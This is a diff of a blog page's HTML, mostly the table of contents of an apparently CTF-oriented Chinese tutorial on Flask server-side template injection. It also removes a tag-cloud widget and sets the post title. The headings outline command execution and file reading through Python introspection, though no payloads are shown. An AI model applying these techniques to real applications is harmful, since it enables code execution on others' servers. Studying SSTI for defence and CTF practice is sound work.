+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E5%AE%9E%E7%8E%B0%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="toc-text">1、实现模板注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">1.1 基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%881%EF%BC%89-class-%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E5%AE%9E%E4%BE%8B%E7%9A%84%E7%B1%BB%E5%AF%B9%E8%B1%A1"><span class="toc-text">（1）_class_ 获取当前实例的类对象</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%882%EF%BC%89-base-%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E7%B1%BB%E7%9A%84%E4%B8%80%E4%B8%AA%E7%BB%A7%E6%89%BF%E7%B1%BB"><span class="toc-text">（2）_base_ 获取当前类的一个继承类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%883%EF%BC%89-mro-%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E7%B1%BB%E7%9A%84%E6%89%80%E6%9C%89%E7%BB%A7%E6%89%BF%E7%B1%BB"><span class="toc-text">（3）_mro_ 获取当前类的所有继承类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%884%EF%BC%89-subclasses-%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E7%B1%BB%E7%9A%84%E6%89%80%E6%9C%89%E7%BB%A7%E6%89%BF%E7%B1%BB%E5%88%97%E8%A1%A8"><span class="toc-text">（4）_subclasses_() 获取当前类的所有继承类列表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%885%EF%BC%89-init-%E7%94%A8%E4%BA%8E%E5%B0%86%E5%AF%B9%E8%B1%A1%E5%AE%9E%E4%BE%8B%E5%8C%96"><span class="toc-text">（5）_init_ 用于将对象实例化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%886%EF%BC%89-dict-%E7%94%A8%E4%BA%8E%E5%88%97%E5%87%BA%E5%BD%93%E5%89%8D%E5%B1%9E%E6%80%A7-%E5%87%BD%E6%95%B0%E7%9A%84%E5%AD%97%E5%85%B8"><span class="toc-text">（6）_dict_ 用于列出当前属性&#x2F;函数的字典</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%887%EF%BC%89-getitem"><span class="toc-text">（7） _getitem_</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%888%EF%BC%89func-globals-%E8%BF%94%E5%9B%9E%E4%B8%80%E4%B8%AA%E5%8C%85%E5%90%AB%E5%87%BD%E6%95%B0%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E7%9A%84%E5%AD%97%E5%85%B8%E5%BC%95%E7%94%A8"><span class="toc-text">（8）func_globals 返回一个包含函数全局变量的字典引用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%889%EF%BC%89-globals-%E5%AF%B9%E4%BF%9D%E5%AD%98%E5%87%BD%E6%95%B0%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F-%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0%E7%9A%84%E6%A8%A1%E5%9D%97%E7%9A%84%E5%85%A8%E5%B1%80%E5%90%8D%E7%A7%B0%E7%A9%BA%E9%97%B4-%E7%9A%84%E5%AD%97%E5%85%B8%E7%9A%84%E5%BC%95%E7%94%A8%E3%80%82"><span class="toc-text">（9）_globals_  对保存函数全局变量(定义函数的模块的全局名称空间)的字典的引用。</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-%E5%AE%9E%E7%8E%B0%E6%81%B6%E6%84%8F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-text">1.2 实现恶意命令注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-text">（1）文件读取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%96%B9%E6%B3%951"><span class="toc-text">（2）命令执行-方法1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%883%EF%BC%89%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%96%B9%E6%B3%952"><span class="toc-text">（3）命令执行-方法2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%884%EF%BC%89%E9%81%8D%E5%8E%86%E6%89%BE%E5%88%B0catch-warnings%E7%9A%84payload"><span class="toc-text">（4）遍历找到catch_warnings的payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E9%99%84%E5%BD%95"><span class="toc-text">2、附录</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E4%B8%80%E4%BA%9B%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%8F%8A%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%87%BD%E6%95%B0"><span class="toc-text">2.1 一些任意代码执行及读取文件函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%881%EF%BC%89os%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-text">（1）os执行系统命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%882%EF%BC%89exec-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-text">（2）exec  任意代码执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%883%EF%BC%89eval-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-text">（3）eval  任意代码执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%884%EF%BC%89timeit-%E6%9C%AC%E6%98%AF%E6%A3%80%E6%B5%8B%E6%80%A7%E8%83%BD%E7%9A%84%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-text">（4）timeit  本是检测性能的，也可以任意代码执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%885%EF%BC%89platform"><span class="toc-text">（5）platform</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%886%EF%BC%89subprocess"><span class="toc-text">（6）subprocess</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%887%EF%BC%89file"><span class="toc-text">（7）file</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%888%EF%BC%89open"><span class="toc-text">（8）open</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%889%EF%BC%89codecs"><span class="toc-text">（9）codecs</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E7%84%B6%E8%80%8C%E2%80%A6%E2%80%A6%E8%BF%99%E5%8F%AA%E6%98%AF%E5%9F%BA%E7%A1%80"><span class="toc-text">3、然而……这只是基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">参考链接</span></a></li></ol>
     </div>
   </section>
 
-
-  
-
-  
-    
-    
-  
-
-  <section class="widget tagcloud shadow desktop mobile">
-    
-  <header>
-    
-      <a href='/blog/tags/'><i class="fas fa-tags fa-fw" aria-hidden="true"></i><span class='name'>热门标签</span></a>
-    
-  </header>
-
-
-    <div class='content'>
-      <a href="/tags/C/" style="font-size: 14px; color: #999">C</a> <a href="/tags/CTF/" style="font-size: 14px; color: #999">CTF</a> <a href="/tags/CTF-web/" style="font-size: 19px; color: #777">CTF-web</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 14px; color: #999">SQL注入</a> <a href="/tags/SSTI/" style="font-size: 14px; color: #999">SSTI</a> <a href="/tags/linux/" style="font-size: 14px; color: #999">linux</a> <a href="/tags/php/" style="font-size: 14px; color: #999">php</a> <a href="/tags/python/" style="font-size: 24px; color: #555">python</a> <a href="/tags/unicode/" style="font-size: 14px; color: #999">unicode</a> <a href="/tags/%E5%97%85%E6%8E%A2/" style="font-size: 14px; color: #999">嗅探</a> <a href="/tags/%E9%87%8D%E5%AE%9A%E5%90%91/" style="font-size: 14px; color: #999">重定向</a>
-    </div>
-  </section>
-
-
-  
 
   
 
 
 </aside>
+
 
 
 		  
@@ -600,8 +742,8 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 <script>
   window.pdata={}
-  pdata.ispage=false;
-  pdata.postTitle="";
+  pdata.ispage=true;
+  pdata.postTitle="flask模板注入";
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   // header 这里无论是否开启pjax都需要
